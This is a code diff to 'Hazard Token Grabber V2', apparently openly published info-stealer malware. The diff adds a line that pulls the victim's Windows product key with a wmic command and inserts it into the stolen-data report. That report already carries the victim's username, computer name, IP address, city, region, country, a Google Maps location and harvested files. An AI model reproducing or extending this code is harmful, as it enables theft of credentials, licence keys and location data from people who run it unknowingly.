@@ -288,6 +288,7 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
+        wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
@@ -306,8 +307,9 @@ class Hazard_Token_Grabber_V2:
                 self.files += f"\n{f}"
         n = 0
         for r, d, files in os.walk(self.tempfolder):
-            n+= len(files)
+            n += len(files)
             self.fileCount = f"{n} Files Found: "
+        backslash = "\n"
         embed = {
             "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
             "embeds": [
@@ -317,7 +319,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 16119101,
 
                     "thumbnail": {
